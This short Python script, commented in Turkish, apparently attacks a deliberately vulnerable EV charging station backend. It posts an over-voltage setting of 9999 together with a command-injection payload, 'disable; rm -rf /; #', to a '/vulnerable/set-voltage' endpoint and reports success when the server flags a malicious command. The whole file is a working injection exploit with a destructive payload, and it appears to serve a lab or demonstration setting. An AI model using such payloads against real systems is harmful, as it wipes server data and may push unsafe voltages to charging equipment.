import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("💀 SUNUCU YOK ETME SALDIRISI (CORRECTED)\n")

# TEHLİKELİ KOMUT!
payload = {
    "voltage_value": "9999",  # Aşırı voltaj
    "dump_load_cmd": "disable; rm -rf /; #"  # TÜM DOSYALARI SİL!
}

try:
    r = requests.post(f"{BACKEND}/vulnerable/set-voltage", params=payload)
    result = r.json()

    print("🚀 İmha komutu gönderildi!")
    print(f"Sonuç: {result}")

    if "Malicious command" in str(result):
        print("\n✅✅✅ SALDIRI BAŞARILI! ✅✅✅")
        print("Gerçek bir sunucuda şu an her şey silinmişti!")
    else:
        print("❌ Beklenmedik yanıt:")
        print(result)

except Exception as e:
    print(f"Error: {e}")
